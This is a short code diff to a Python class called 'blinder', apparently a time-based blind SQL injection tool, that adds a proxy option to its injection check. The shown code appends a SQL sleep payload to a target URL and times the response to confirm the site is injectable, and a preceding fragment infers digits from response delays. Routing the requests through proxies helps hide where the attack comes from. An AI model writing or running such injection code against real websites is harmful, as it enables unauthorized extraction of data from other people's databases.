@@ -44,10 +44,10 @@ class blinder:
             if time > self.sleep:
                 return digit
 
-    def check_injection(self, ua=None):
+    def check_injection(self, ua=None, proxy=None):
         test_query = ' AND (SELECT IF(length("a") = 1,sleep(%s),"Null"))' % self.sleep
         url = self.url + test_query
-        req = requests.get(url, headers=ua)
+        req = requests.get(url, headers=ua, proxies=proxy)
         time = req.elapsed.total_seconds()
         if time > self.sleep:
             return True
